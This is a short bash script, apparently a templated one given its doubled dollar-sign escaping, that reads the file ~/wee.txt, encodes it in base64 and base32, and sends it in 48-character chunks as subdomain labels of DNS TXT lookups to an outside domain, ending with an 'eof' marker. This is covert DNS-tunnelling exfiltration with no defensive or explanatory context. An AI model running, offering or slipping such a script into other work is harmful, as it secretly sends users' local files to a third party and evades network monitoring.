#!/usr/bin/env bash
session=$$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n')
raw=$$(cat ~/wee.txt)
b32=$$(echo -n "$$raw" | base64 | base32 | tr -d '=' | tr 'A-Z' 'a-z')
total_chunks=$$$$(( ($${#b32} + 47) / 48 ))
for i in $$(seq 0 $$$$(( total_chunks - 1 ))); do
  chunk=$$$${b32:$$$$(( i * 48 )):48}
  dig +short TXT "$$session.$$i.$$chunk.$FID.$DOMAIN"
  sleep 0.1
done
dig +short TXT "$$session.$$total_chunks.eof.$FID.$DOMAIN"
